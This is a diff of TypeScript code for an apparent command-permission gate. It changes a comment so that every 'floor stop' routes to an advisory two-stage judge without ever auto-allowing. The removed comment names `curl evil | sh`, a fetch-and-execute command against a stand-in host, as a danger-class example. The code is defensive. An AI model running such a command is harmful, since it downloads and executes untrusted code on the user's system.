@@ -127,12 +127,11 @@ export async function tryDspaAutoAllow(
   const pd = decision.promptData;
   const gateResult = await checkDspaGate(pd, store);
   if (!gateResult.ok) {
-    // D10/D11 (docs/dspa-redesign.md): scope-class stops (outside base,
-    // unresolvable location) and untrusted packages stop the auto-allow, but
-    // the judge still runs both stages — its verdict renders in the prompt
-    // as advisory input to the allow/deny/grant decision (a verdict on
-    // `curl evil | sh` would be noise — danger-class stops stay bare).
-    // Never an auto-allow: the floor's stop stands.
+    // D16 (docs/dspa-redesign.md): EVERY floor stop is advisory — the
+    // judge still runs both stages and its verdict renders in the prompt
+    // as input to the allow/deny/grant decision. Never an auto-allow: the
+    // floor's stop stands. (A bare stop — no judge call — is the
+    // defensive fallback below; the gate currently never emits one.)
     if (gateResult.advisory) {
       const v1 = await getJudgeVerdict(pd, ctx, store);
       const v2 = await getStage2Verdict(pd, ctx, store);
